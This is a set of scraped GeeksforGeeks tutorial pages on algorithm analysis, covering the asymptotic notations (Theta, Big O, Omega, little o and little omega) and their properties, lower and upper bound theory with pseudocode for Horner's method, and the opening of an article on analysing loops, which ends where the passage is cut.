Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithms | Set 3 (Asymptotic Notations) Last Updated: 19-12-2020 We have discussed Asymptotic Analysis, and Worst, Average, and Best Cases of Algorithms. The main idea of asymptotic analysis is to have a measure of the efficiency of algorithms that don’t depend on machine-specific constants and doesn’t require algorithms to be implemented and time taken by programs to be compared. Asymptotic notations are mathematical tools to represent the time complexity of algorithms for asymptotic analysis. The following 3 asymptotic notations are mostly used to represent the time complexity of algorithms. 1) Θ Notation: The theta notation bounds a function from above and below, so it defines exact asymptotic behavior. A simple way to get Theta notation of an expression is to drop low order terms and ignore leading constants. For example, consider the following expression. 3n3 + 6n2 + 6000 = Θ(n3) Dropping lower order terms is always fine because there will always be a n0 after which Θ(n3) has higher values than Θn2) irrespective of the constants involved. For a given function g(n), we denote Θ(g(n)) is following set of functions. Θ(g(n)) = {f(n): there exist positive constants c1, c2 and n0 such that 0 <= c1*g(n) <= f(n) <= c2*g(n) for all n >= n0} The above definition means, if f(n) is theta of g(n), then the value f(n) is always between c1*g(n) and c2*g(n) for large values of n (n >= n0). The definition of theta also requires that f(n) must be non-negative for values of n greater than n0. 2) Big O Notation: The Big O notation defines an upper bound of an algorithm, it bounds a function only from above. For example, consider the case of Insertion Sort. It takes linear time in best case and quadratic time in worst case. We can safely say that the time complexity of Insertion sort is O(n^2). Note that O(n^2) also covers linear time. If we use Θ notation to represent time complexity of Insertion sort, we have to use two statements for best and worst cases: 1. The worst case time complexity of Insertion Sort is Θ(n^2). 2. The best case time complexity of Insertion Sort is Θ(n). The Big O notation is useful when we only have upper bound on time complexity of an algorithm. Many times we easily find an upper bound by simply looking at the algorithm. O(g(n)) = { f(n): there exist positive constants c and n0 such that 0 <= f(n) <= c*g(n) for all n >= n0} 3) Ω Notation: Just as Big O notation provides an asymptotic upper bound on a function, Ω notation provides an asymptotic lower bound. Ω Notation can be useful when we have lower bound on time complexity of an algorithm. As discussed in the previous post, the best case performance of an algorithm is generally not useful, the Omega notation is the least used notation among all three. For a given function g(n), we denote by Ω(g(n)) the set of functions. Ω (g(n)) = {f(n): there exist positive constants c and n0 such that 0 <= c*g(n) <= f(n) for all n >= n0}. Let us consider the same Insertion sort example here. The time complexity of Insertion Sort can be written as Ω(n), but it is not a very useful information about insertion sort, as we are generally interested in worst case and sometimes in average case. Properties of Asymptotic Notations : As we have gone through the definition of this three notations let’s now discuss some important properties of those notations. 1. General Properties : If f(n) is O(g(n)) then a*f(n) is also O(g(n)) ; where a is a constant. Example: f(n) = 2n²+5 is O(n²) then 7*f(n) = 7(2n²+5) = 14n²+35 is also O(n²) . Similarly this property satisfies for both Θ and Ω notation. We can say If f(n) is Θ(g(n)) then a*f(n) is also Θ(g(n)) ; where a is a constant. If f(n) is Ω (g(n)) then a*f(n) is also Ω (g(n)) ; where a is a constant. 2. Transitive Properties : If f(n) is O(g(n)) and g(n) is O(h(n)) then f(n) = O(h(n)) . Example: if f(n) = n, g(n) = n² and h(n)=n³ n is O(n²) and n² is O(n³) then n is O(n³) Similarly this property satisfies for both Θ and Ω notation. We can say If f(n) is Θ(g(n)) and g(n) is Θ(h(n)) then f(n) = Θ(h(n)) . If f(n) is Ω (g(n)) and g(n) is Ω (h(n)) then f(n) = Ω (h(n)) 3. Reflexive Properties : Reflexive properties are always easy to understand after transitive. If f(n) is given then f(n) is O(f(n)). Since MAXIMUM VALUE OF f(n) will be f(n) ITSELF ! Hence x = f(n) and y = O(f(n) tie themselves in reflexive relation always. Example: f(n) = n² ; O(n²) i.e O(f(n)) Similarly this property satisfies for both Θ and Ω notation. We can say that: If f(n) is given then f(n) is Θ(f(n)). If f(n) is given then f(n) is Ω (f(n)). 4. Symmetric Properties : If f(n) is Θ(g(n)) then g(n) is Θ(f(n)) . Example: f(n) = n² and g(n) = n² then f(n) = Θ(n²) and g(n) = Θ(n²) This property only satisfies for Θ notation. 5. Transpose Symmetric Properties : If f(n) is O(g(n)) then g(n) is Ω (f(n)). Example: f(n) = n , g(n) = n² then n is O(n²) and n² is Ω (n) This property only satisfies for O and Ω notations. 6. Some More Properties : 1.) If f(n) = O(g(n)) and f(n) = Ω(g(n)) then f(n) = Θ(g(n)) 2.) If f(n) = O(g(n)) and d(n)=O(e(n)) then f(n) + d(n) = O( max( g(n), e(n) )) Example: f(n) = n i.e O(n) d(n) = n² i.e O(n²) then f(n) + d(n) = n + n² i.e O(n²) 3.) If f(n)=O(g(n)) and d(n)=O(e(n)) then f(n) * d(n) = O( g(n) * e(n) ) Example: f(n) = n i.e O(n) d(n) = n² i.e O(n²) then f(n) * d(n) = n * n² = n³ i.e O(n³) _______________________________________________________________________________ Exercise: Which of the following statements is/are valid? 1. Time Complexity of QuickSort is Θ(n^2) 2. Time Complexity of QuickSort is O(n^2) 3. For any two functions f(n) and g(n), we have f(n) = Θ(g(n)) if and only if f(n) = O(g(n)) and f(n) = Ω(g(n)). 4. Time complexity of all computer algorithms can be written as Ω(1) Important Links : There are two more notations called little o and little omega. Little o provides strict upper bound (equality condition is removed from Big O) and little omega provides strict lower bound (equality condition removed from big omega) Analysis of Algorithms | Set 4 (Analysis of Loops) Recent Articles on analysis of algorithm. References:Lec 1 | MIT (Introduction to Algorithms) This article is contributed by Abhay Rathi. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 1 (Asymptotic Analysis)Properties of Asymptotic NotationsAsymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1Improved By : OmkarJai, AmiyaRanjanRout, kaustubh765 Article Tags : AnalysisArticles thumb_up 145 To-do Done 1.7 Based on 273 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page NP-Completeness | Set 1 (Introduction) Next last_page Analysis of Algorithms | Set 4 (Analysis of Loops) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity AnalysisTime complexity of recursive Fibonacci program Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of algorithms | little o and little omega notations - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Time Complexity of building a heapComplexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Big-O analysisAnalysis of different sorting techniquesTail RecursionNP-Completeness | Set 1 (Introduction)Complexity Analysis of Binary SearchAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does 'Space Complexity' mean?Analysis of Algorithms | Set 5 (Practice Problems)Lower and Upper Bound TheoryCyclomatic ComplexityA Time Complexity QuestionMeasure execution time with high precision in C/C++Time complexity of recursive Fibonacci programDifference between Recursion and IterationDifference between NP hard and NP complete problemDifference between Big Oh, Big Omega and Big ThetaIn-Place AlgorithmPseudo-polynomial AlgorithmsTime Complexity Analysis | Tower Of Hanoi (Recursion)Sort elements by frequency | Set 5 (using Java Map) Analysis of algorithms | little o and little omega notations Last Updated: 19-04-2020 The main idea of asymptotic analysis is to have a measure of efficiency of algorithms that doesn’t depend on machine specific constants, mainly because this analysis doesn’t require algorithms to be implemented and time taken by programs to be compared. We have already discussed Three main asymptotic notations. The following 2 more asymptotic notations are used to represent time complexity of algorithms. Little ο asymptotic notation Big-Ο is used as a tight upper-bound on the growth of an algorithm’s effort (this effort is described by the function f(n)), even though, as written, it can also be a loose upper-bound. “Little-ο” (ο()) notation is used to describe an upper-bound that cannot be tight. Definition : Let f(n) and g(n) be functions that map positive integers to positive real numbers. We say that f(n) is ο(g(n)) (or f(n) Ε ο(g(n))) if for any real constant c > 0, there exists an integer constant n0 ≥ 1 such that 0 ≤ f(n) < c*g(n). Thus, little o() means loose upper-bound of f(n). Little o is a rough estimate of the maximum order of growth whereas Big-Ο may be the actual order of growth. In mathematical relation, f(n) = o(g(n)) means lim f(n)/g(n) = 0 n→∞ Examples: Is 7n + 8 ∈ o(n2)? In order for that to be true, for any c, we have to be able to find an n0 that makes f(n) < c * g(n) asymptotically true. lets took some example, If c = 100,we check the inequality is clearly true. If c = 1/100 , we’ll have to use a little more imagination, but we’ll be able to find an n0. (Try n0 = 1000.) From these examples, the conjecture appears to be correct. then check limits, lim f(n)/g(n) = lim (7n + 8)/(n2) = lim 7/2n = 0 (l’hospital) n→∞ n→∞ n→∞ hence 7n + 8 ∈ o(n2) Little ω asymptotic notation Definition : Let f(n) and g(n) be functions that map positive integers to positive real numbers. We say that f(n) is ω(g(n)) (or f(n) ∈ ω(g(n))) if for any real constant c > 0, there exists an integer constant n0 ≥ 1 such that f(n) > c * g(n) ≥ 0 for every integer n ≥ n0. f(n) has a higher growth rate than g(n) so main difference between Big Omega (Ω) and little omega (ω) lies in their definitions.In the case of Big Omega f(n)=Ω(g(n)) and the bound is 0<=cg(n)<=f(n), but in case of little omega, it is true for 0<=c*g(n)<f(n). The relationship between Big Omega (Ω) and Little Omega (ω) is similar to that of Big-Ο and Little o except that now we are looking at the lower bounds. Little Omega (ω) is a rough estimate of the order of the growth whereas Big Omega (Ω) may represent exact order of growth. We use ω notation to denote a lower bound that is not asymptotically tight. And, f(n) ∈ ω(g(n)) if and only if g(n) ∈ ο((f(n)). In mathematical relation, if f(n) ∈ ω(g(n)) then, lim f(n)/g(n) = ∞ n→∞ Example: Prove that 4n + 6 ∈ ω(1); the little omega(ο) running time can be proven by applying limit formula given below. if lim f(n)/g(n) = ∞ then functions f(n) is ω(g(n)) n→∞ here,we have functions f(n)=4n+6 and g(n)=1 lim (4n+6)/(1) = ∞ n→∞ and,also for any c we can get n0 for this inequality 0 <= c*g(n) < f(n), 0 <= c*1 < 4n+6 Hence proved. This article is contributed by Kadam Patel. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 3 (Asymptotic Notations)Difference between Big Oh, Big Omega and Big ThetaAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Properties of Asymptotic NotationsAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisDifference between Posteriori and Priori analysisAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisImproved By : OmkarJai, tannishakundu Article Tags : Analysis thumb_up 36 To-do Done 2.2 Based on 47 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Master Theorem For Subtract and Conquer Recurrences Next last_page Online Algorithm Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Proof that SAT is NP CompleteProof that traveling salesman problem is NP HardPractice Set for Recurrence RelationsSet cover is NP Complete More related articles in Analysis Applications of HashingDifferent types of recurrence relations and their solutionsDifference between Deterministic and Non-deterministic AlgorithmsHow to learn Pattern printing easily?Properties of Asymptotic Notations room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Lower and Upper Bound Theory - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Lower and Upper Bound TheoryAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortRecursionA* Search AlgorithmDifference between BFS and DFSHow to write a Pseudo Code?Data Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsPlayfair Cipher with Examples Lower and Upper Bound Theory Last Updated: 04-04-2020 The Lower and Upper Bound Theory provides a way to find the lowest complexity algorithm to solve a problem. Before understanding the theory, first lets have a brief look on what actually Lower and Upper bounds are. Lower Bound – Let L(n) be the running time of an algorithm A(say), then g(n) is the Lower Bound of A if there exist two constants C and N such that L(n) >= C*g(n) for n > N. Lower bound of an algorithm is shown by the asymptotic notation called Big Omega (or just Omega). Upper Bound – Let U(n) be the running time of an algorithm A(say), then g(n) is the Upper Bound of A if there exist two constants C and N such that U(n) <= C*g(n) for n > N. Upper bound of an algorithm is shown by the asymptotic notation called Big Oh(O) (or just Oh). 1. Lower Bound Theory: According to the lower bound theory, for a lower bound L(n) of an algorithm, it is not possible to have any other algorithm (for a common problem) whose time complexity is less than L(n) for random input. Also every algorithm must take at least L(n) time in worst case. Note that L(n) here is the minimum of all the possible algorithm, of maximum complexity. The Lower Bound is a very important for any algorithm. Once we calculated it, then we can compare it with the actual complexity of the algorithm and if their order are same then we can declare our algorithm as optimal. So in this section we will be discussing about techniques for finding the lower bound of an algorithm. Note that our main motive is to get an optimal algorithm, which is the one having its Upper Bound Same as its Lower Bound (U(n)=L(n)). Merge Sort is a common example of an optimal algorithm. Trivial Lower Bound – It is the easiest method to find the lower bound. The Lower bounds which can be easily observed on the basis of the number of input taken and the number of output produces are called Trivial Lower Bound. Example: Multiplication of n x n matrix, where, Input: For 2 matrix we will have 2n2 inputs Output: 1 matrix of order n x n, i.e., n2 outputs In the above example its easily predictable that the lower bound is O(n2). Computational Model – The method is for all those algorithms that are comparison based. For example in sorting we have to compare the elements of the list among themselves and then sort them accordingly. Similar is the case with searching and thus we can implement the same in this case. Now we will look at some examples to understand its usage. Ordered Searching – It is a type of searching in which the list is already sorted. Example-1: Linear search Explanation – In linear search we compare the key with first element if it does not match we compare with second element and so on till we check against the nth element. Else we will end up with a failure. Example-2: Binary search Explanation – In binary search, we check the middle element against the key, if it is greater we search the first half else we check the second half and repeat the same process. The diagram below there is an illustration of binary search in an array consisting of 4 elements Calculating the lower bound: The max no of comparisons are n. Let there be k levels in the tree. No. of nodes will be 2k-1 The upper bound of no of nodes in any comparison based search of an element in list of size n will be n as there are maximum of n comparisons in worst case scenario 2k-1 Each level will take 1 comparison thus no. of comparisons k≥|log2n| Thus the lower bound of any comparison based search from a list of n elements cannot be less than log(n). Therefore we can say that Binary Search is optimal as its complexity is Θ(log n). Sorting – The diagram below is an example of tree formed in sorting combinations with 3 elements. Example – For n elements, finding lower bound using computation model. Explanation – For n elements we have a total on n! combinations (leaf nodes). (Refer the diagram the total combinations are 3! or 6) also it is clear that the tree formed is a binary tree. Each level in the diagram indicates a comparison. Let there be k levels => 2k is the total number of leaf nodes in a full binary tree thus in this case we have n!≤2k. As the k in the above example is the no of comparisons thus by computational model lower bond = k. Now we can say that, n!≤2T(n) Thus, T(n)>|log n!| => n!<=nn Thus, log n!<=log nn Taking ceiling function on both sides, we get |-log nn-|>=|-log n!-| Thus complexity becomes Θ(lognn) or Θ(nlogn) Using Lower bond theory to solve algebraic problem: Straight Line Program – The type of programs build without any loops or control structures is called Straight Line Program. For example, filter_none edit close play_arrow link brightness_4 code //summing to nos Sum(a, b) { //no loops and no control structures c:= a+b; return c; } chevron_right filter_none Algebraic Problem – Problems related to algebra like solving equations inequalities etc., comes under algebraic problems. For example, solving equation ax2+bx+c with simple programming. filter_none edit close play_arrow link brightness_4 code Algo_Sol(a, b, c, x) { //1 assignment v:=a*x; //1 assignment v:=v+b; //1 assignment v:=v*x; //1 assignment ans:=v+c; return ans; } chevron_right filter_none Complexity for solving here is 4 (excluding the returning). The above example shows us a simple way to solve an equation for 2 degree polynomial i.e., 4 thus for nth degree polynomial we will have complexity of O(n2). Let us demonstrate via an algorithm. Example: anxn+an-1xn-1+an-2xn-2+…+a1x+a0 is a polynomial of degree n. filter_none edit close play_arrow link brightness_4 code pow(x, n) { p := 1; //loop from 1 to n for i:=1 to n p := p*x; return p; } polynomial(A, x, n) { int p, v:=0; for i := 0 to n //loop within a loop from 0 to n v := v + A[i]*pow(x, i); return v; } chevron_right filter_none Loop within a loop => complexity = O(n2); Now to find an optimal algorithm we need to find the lower bound here (as per lower bound theory). As per Lower Bound Theory, The optimal algorithm to solve the above problem is the one having complexity O(n). Lets prove this theorem using lower bounds. Theorem: To prove that optimal algo of solving a n degree polynomial is O(n) Proof: The best solution for reducing the algo is to make this problem less complex by dividing the polynomial into several straight line problems. => anxn+an-1xn-1+an-2xn-2+...+a1x+a0 can be written as, ((..(anx+an-1)x+..+a2)x+a1)x+a0 Now, algorithm will be as, v=0 v=v+an v=v*x v=v+an-1 v=v*x ... v=v+a1 v=v*x v=v+a0 filter_none edit close play_arrow link brightness_4 code polynomial(A, x, n) { int p, v=0; // loop executed n times for i = n to 0 v = (v + A[i])*x; return v; } chevron_right filter_none Clearly, the complexity of this code is O(n). This way of solving such equations is called Horner’s method. Here is were lower bound theory works and give the optimum algorithm’s complexity as O(n). 2. Upper Bound Theory: According to the upper bound theory, for an upper bound U(n) of an algorithm, we can always solve the problem in at most U(n) time.Time taken by a known algorithm to solve a problem with worse case input gives us the upper bound. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Scala | Upper boundScala | Lower BoundPython program to count upper and lower case characters without using inbuilt functionsGenerate Binary Strings of length N using Branch and BoundBound, unbound, and static methods in Python0/1 Knapsack using Least Count Branch and BoundDifference between Backtracking and Branch-N-Bound techniqueScala - View BoundJava Program to Display Upper Triangular MatrixConvert given upper triangular Matrix to 1D ArrayLower Insertion PointMinimum number of operations to move all uppercase characters before all lower case charactersJava Program to Display Lower Triangular MatrixThe prisoner's dilemma in Game theoryMathematics | Graph theory practice questionsHalting Problem in Theory of ComputationGame Theory (Normal - form game) | Set 1 (Introduction)Proof that Independent Set in Graph theory is NP CompleteExpectimax Algorithm in Game TheorySum and Product of minimum and maximum element of an Arraypiyush25pvIm a final year MCA student at Panjab University, Chandigarh, one of the most prestigious university of India I am skilled in various aspects related to Web Development and AI I have worked as a freelancer at upwork and thus have knowledge on various aspects related to NLP, image processing and webIf you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : soumya7 Article Tags : AlgorithmsAnalysisTechnical ScripterTechnical Scripter 2018 Practice Tags : Algorithms thumb_up 28 To-do Done 2.3 Based on 23 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page How compare() method works in Java Next last_page Count the number of pop operations on stack to get each element of the array Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Algorithms Difference between NP hard and NP complete problemComplexity Analysis of Binary SearchCyclomatic ComplexityTop 50 Array Coding Problems for InterviewsComparison among Bubble Sort, Selection Sort and Insertion Sort Most visited in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Difference between NP hard and NP complete problemUnderstanding Time Complexity with Simple Examples room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 4 (Analysis of Loops) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Complexity of different operations in Binary tree, Binary Search Tree and AVL treeUnderstanding Time Complexity with Simple Examples Analysis of Algorithms | Set 4 (Analysis of Loops) Last Updated: 08-05-2019 We have discussed Asymptotic Analysis, Worst, Average and Best Cases and Asymptotic Notations in previous posts. In this post, analysis of iterative programs with simple examples is discussed. 1) O(1): Time complexity of a function (or set of statements) is considered as O(1) if it doesn’t contain loop, recursion and call to any other non-constant time function. // set of non-recursive and non-loop statements For example swap() function has O(1) time complexity. A loop or recursion that runs a constant number of times is also considered as O(1). For example the following loop 